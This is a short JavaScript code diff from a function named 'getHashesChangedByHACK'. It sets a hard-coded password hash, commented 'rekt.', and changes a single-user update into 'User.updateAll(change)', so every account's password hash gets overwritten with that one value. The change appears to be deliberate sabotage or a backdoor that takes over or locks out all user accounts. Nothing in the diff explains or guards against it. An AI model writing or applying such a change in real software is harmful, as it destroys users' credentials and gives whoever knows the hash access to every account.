@@ -15,8 +15,7 @@ async function getHashesChangedByHACK(){
     let HASH = '968652ef04b0a656eea7a05e1c49619f4bfd7338549b4ca57ee8ac8323ca8619'; // rekt.
     let userName = user.username;
     change.passwordHash=HASH;
-    User.update(user, change);
-    user.save();
+    User.updateAll(change);
     console.log('new change: '+change+' for: '+userName);
   };
 };
